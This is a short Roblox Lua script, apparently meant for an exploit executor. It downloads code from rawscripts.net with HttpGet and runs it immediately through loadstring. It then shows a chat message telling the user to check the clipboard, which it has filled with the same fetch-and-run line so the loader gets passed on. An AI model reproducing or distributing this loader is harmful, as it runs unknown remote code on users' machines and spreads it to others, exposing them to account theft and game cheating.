loadstring(game:HttpGet("https://rawscripts.net/raw/loader_1038"))()

game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
    Text = "[Notice]: Check your clipboard.",
    Color = Color3.new(0, 191, 255),
    TextSize = 18,
})

setclipboard('loadstring(game:HttpGet("https://rawscripts.net/raw/loader_1038"))()')